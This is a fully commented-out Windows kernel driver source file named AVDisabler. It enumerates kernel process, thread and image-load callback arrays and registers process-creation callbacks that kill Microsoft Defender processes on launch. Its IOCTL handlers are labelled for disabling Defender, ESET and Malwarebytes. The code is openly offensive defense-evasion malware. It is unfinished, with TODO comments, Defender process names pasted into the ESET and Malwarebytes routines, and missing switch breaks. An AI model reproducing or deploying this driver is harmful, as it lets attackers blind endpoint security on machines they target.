//	if(!(*PspCreateProcessNotifyRoutine))
//	{
//		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateProcessNotifyRoutine address is 0x0,\neither there is no process creation callback routines or there is a bug\n"));
//		return STATUS_INVALID_ADDRESS;
//	}
//	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateProcessNotifyRoutine: 0x%p\n", *PspCreateProcessNotifyRoutine));
//	
//	//CallbackIndex = 0; // Thread type
//	CallbackIndex = 0;
//	PspEnumerateCallback(0, &CallbackIndex, PspCreateThreadNotifyRoutine);
//	if (!(*PspCreateThreadNotifyRoutine))
//	{
//		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateThreadNotifyRoutine address is 0x0,\neither there is no thread creation callback routines or there is a bug\n"));
//		return STATUS_INVALID_ADDRESS;
//	}
//	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateThreadNotifyRoutine: 0x%p\n", *PspCreateThreadNotifyRoutine));
//	
//	//CallbackIndex = 2; // Image type
//	CallbackIndex = 0;
//	PspEnumerateCallback(2, &CallbackIndex, PspLoadImageNotifyRoutine);
//	if (!(*PspLoadImageNotifyRoutine))
//	{
//		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspLoadImageNotifyRoutine address is 0x0,\neither there is no load image callback routines or there is a bug\n"));
//		return STATUS_INVALID_ADDRESS;
//	}
//	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspLoadImageNotifyRoutine: 0x%p\n", *PspLoadImageNotifyRoutine));
//	return STATUS_SUCCESS;
//}
//
//void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
//{
//	NTSTATUS status = STATUS_SUCCESS;
//	HANDLE hProcess = nullptr;
//
//	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
//	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
//	KdPrint(("[+]AVDisablerDriver::PreventEsetProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
//
//	// checking if the process being created is one of ESET's processes
//	// 
//	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
//	UNICODE_STRING ImageFileName;
//	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
//		return;
//	}
//	// checking if the process being created is one of Eset's processes
//	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
//	{
//		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
//		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
//			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
//
//	}
//}
//
//void PreventMalwareBytesProcessCreate(PEPROCESS Process,
//	HANDLE ProcessId,
//	PPS_CREATE_NOTIFY_INFO CreateInfo)
//{
//
//	NTSTATUS status = STATUS_SUCCESS;
//	HANDLE hProcess = nullptr;
//
//	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
//	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
//	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
//
//	// checking if the process being created is one of Malwarebyte's processes
//	// 
//	// ---------- !!!!!need to modify the processes' variables to Malwarebytes images names!!!!! ----------
//	UNICODE_STRING ImageFileName;
//	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
//		return;
//	}
//	// checking if the process being created is one of MalwareBytes's processes
//	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
//	{
//		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
//		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
//			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
//
//	}
//}
//
//NTSTATUS CompleteRequest(NTSTATUS status, PIRP Irp, ULONG_PTR information)
//{
//	Irp->IoStatus.Status = status;
//	Irp->IoStatus.Information = information;
//	IoCompleteRequest(Irp, 0);
//	
//	return status;
//}
//
//
//NTSTATUS CreateCloseDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) 
//{
//	UNREFERENCED_PARAMETER(DeviceObject);
//	return CompleteRequest(STATUS_SUCCESS, Irp, 0);
//}
//
//
//NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
//{
//	UNREFERENCED_PARAMETER(DeviceObject);
//	NTSTATUS status = STATUS_SUCCESS;
//	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
//	char OutputBuffer[256];
//
//	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
//	{
//		case IOCTL_DISABLE_DEFENDER:
//		{
//			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
//			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
//			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
//
//			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
//			{
//				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
//				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
//			}
//
//			status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, FALSE);
//			
//			if (!NT_SUCCESS(status)) 
//			{
//				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
//				KdPrint((OutputBuffer));
//				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
//				return CompleteRequest(status, Irp, sizeof(OutputBuffer));
//			}
//
//			g_IsDefenderCallbackRoutineSet = TRUE;
//			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
//		}
//
//		case IOCTL_DISABLE_ESET:
//		{
//			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
//			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
//			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
//			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
//			{
//				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
//				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
//			}
//
//			status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, FALSE);
//			if (!NT_SUCCESS(status))
//			{
//				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
//				KdPrint((OutputBuffer));
//				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
//				return CompleteRequest(status, Irp, 0);
//			}
//			g_IsEsetCallbackRoutineSet = TRUE;
//			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n"));
//
//		}
//
//		case IOCTL_DISABLE_MALWAREBYTES:
//		{
//			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
//			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
//			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
//			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
//			{
//				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
//				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
//
//			}
//
//			status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, FALSE);
//			if (!NT_SUCCESS(status))
//			{
//				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
//				KdPrint((OutputBuffer));
//				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
//				return CompleteRequest(status, Irp, 0);
//			}
//			g_IsMalwareBytesCallbackRoutineSet = TRUE;
//			KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n"));
//		}
//	}
//
//	return CompleteRequest(status, Irp, 0);
//}
//
//VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
//{
//	NTSTATUS status = STATUS_SUCCESS;
//	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
//	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");
//
//	if(g_IsDefenderCallbackRoutineSet)
//	{
//		status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, TRUE);
//		if (!NT_SUCCESS(status))
//			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset Defender's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
//	}
//
//	if (g_IsEsetCallbackRoutineSet)
//	{
//		status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, TRUE);
//		if (!NT_SUCCESS(status))
//			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
//	}
//
//	if (g_IsMalwareBytesCallbackRoutineSet)
//	{
//		status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, TRUE); //<- needs to be defined first
//		if (!NT_SUCCESS(status))
//			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset MalwareBytes' related process creation callback routine\n (NTSTATUS: 0x%x)", status));
//	}
//
//	IoDeleteDevice(DeviceObject);
//	status = IoDeleteSymbolicLink(&DeviceSymlink);
//	if(!NT_SUCCESS(status))
//	{
//		KdPrint(("[-] AVDisablerDriver[Unload Routine]: couldn't delete symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceSymlink, status));
//		return;
//	}
//	
//	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));	
//}
//
//extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
//{
//	UNREFERENCED_PARAMETER(RegistryPath);
//	NTSTATUS status = STATUS_SUCCESS;
//	PDEVICE_OBJECT DeviceObject = nullptr;
//	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\AVDisabler");
//	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");
//
//	UNICODE_STRING TestFullPath = RTL_CONSTANT_STRING(L"C:\\Users\\user\\test.txt");
//	UNICODE_STRING a;
//	status = GetFileNameFromPath(TestFullPath, &a);
//
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
//		return status;
//	}
//	KdPrint(("[+] AVDisabler::DriverEntry: GetFileNameFromPath was executed successfully and returned: %wZ", &a));
//
//	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[*] Error creating device %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
//		return status;
//	}
//	KdPrint(("[+] AVDisabler::DriverEntry: Device %wZ was created successfully!\n", &DeviceName));
//
//	status = IoCreateSymbolicLink(&DeviceSymlink, &DeviceName);
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[*] Error creating device symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
//		IoDeleteDevice(DeviceObject);
//		return status;
//	}
//
//	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));
//
//	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
//	
//	ULONG_PTR PspCreateProcessCallbackRoutineBaseAddress = PspCreateProcessCallbackRoutine;
//	ULONG_PTR PspCreateThreadCallbackRoutineBaseAddress = PspCreateThreadCallbackRoutine;
//	ULONG_PTR PspLoadImageCallbackRoutineBaseAddress = PspLoadImageCallbackRoutine;
//
//	DWORD32 PspCreateThreadCallbackRoutineCount = 0;
//	DWORD32 PspCreateProcessCallbackRoutineCount = 0;
//	DWORD32 PspLoadImageCallbackRoutineCount = 0;
//
//	KdPrint(("\n"));
//
//	while (*(ULONG_PTR**)PspCreateProcessCallbackRoutine != (ULONG_PTR)0x0 ||
//		   *(ULONG_PTR**)PspCreateThreadCallbackRoutine != (ULONG_PTR)0x0 ||
//		   *(ULONG_PTR**)PspLoadImageCallbackRoutine != (ULONG_PTR)0x0)
//	{
//		if (*(ULONG_PTR**)PspCreateProcessCallbackRoutine == (ULONG_PTR)0x0 &&
//			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
//			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
//		{
//			PspCreateThreadCallbackRoutine += 0x8;
//			PspLoadImageCallbackRoutine += 0x8;
//
//			PspCreateThreadCallbackRoutineCount++;
//			PspLoadImageCallbackRoutineCount++;
//
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
//		}
//
//		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == (ULONG_PTR)0x0 &&
//				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0 &&
//				 *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
//		{
//			PspCreateProcessCallbackRoutine += 0x8;
//			PspLoadImageCallbackRoutine += 0x8;
//
//			PspCreateProcessCallbackRoutineCount++;
//			PspLoadImageCallbackRoutineCount++;
//
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
//
//		}
//
//		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == (ULONG_PTR)0x0 &&
//			     *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
//				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
//		{
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
//
//			PspCreateProcessCallbackRoutine += 0x8;
//			PspCreateThreadCallbackRoutine += 0x8;
//
//			PspCreateProcessCallbackRoutineCount++;
//			PspCreateThreadCallbackRoutineCount++;
//		}
//
//		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
//				 *(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
//				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
//		{
//			PspCreateProcessCallbackRoutine += 0x8;
//			PspCreateProcessCallbackRoutineCount++;
//		}
//
//		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
//			     *(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
//				 *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0)
//		{
//			PspCreateThreadCallbackRoutine += 0x8;
//			PspCreateThreadCallbackRoutineCount++;
//		}
//
//		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
//				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
//				 *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
//		{
//			PspLoadImageCallbackRoutine += 0x8;
//			PspLoadImageCallbackRoutineCount++;
//		}
//
//		else if(*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0 &&
//				*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
//				*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
//		{
//			PspCreateProcessCallbackRoutine += 0x8;
//			PspCreateThreadCallbackRoutine += 0x8;
//			PspLoadImageCallbackRoutine += 0x8;
//
//			PspCreateProcessCallbackRoutineCount++;
//			PspCreateThreadCallbackRoutineCount++;
//			PspLoadImageCallbackRoutineCount++;
//
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
//			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
//		}
//	}
//
//	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutineCount: %d\n", PspCreateProcessCallbackRoutineCount));
//	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutineCount: %d\n", PspCreateThreadCallbackRoutineCount));
//	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutineCount: %d\n", PspLoadImageCallbackRoutineCount));
//
//	KdPrint(("\n"));
//
//	for (int i = 0; i < PspCreateProcessCallbackRoutineCount; i++)
//	{
//		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateProcessCallbackRoutineBaseAddress)));
//		PspCreateProcessCallbackRoutineBaseAddress += 0x8;
//	}
//
//	KdPrint(("\n"));
//
//	for (int i = 0; i < PspCreateThreadCallbackRoutineCount; i++)
//	{
//		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateThreadCallbackRoutineBaseAddress)));
//		PspCreateThreadCallbackRoutineBaseAddress += 0x8;
//	}
//
//	KdPrint(("\n"));
//
//	for (int i = 0; i < PspLoadImageCallbackRoutineCount; i++)
//	{
//		KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspLoadImageCallbackRoutineBaseAddress)));
//		PspLoadImageCallbackRoutineBaseAddress += 0x8;
//	}	
//
//	KdPrint(("\n"));
//
//	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
//	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
//	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
//	DriverObject->DriverUnload = UnloadRoutine;
//
//	KdPrint(("AVDisabler::DriverEntry: Initialization completed successfully!\n"));
//
//	return status;
//}
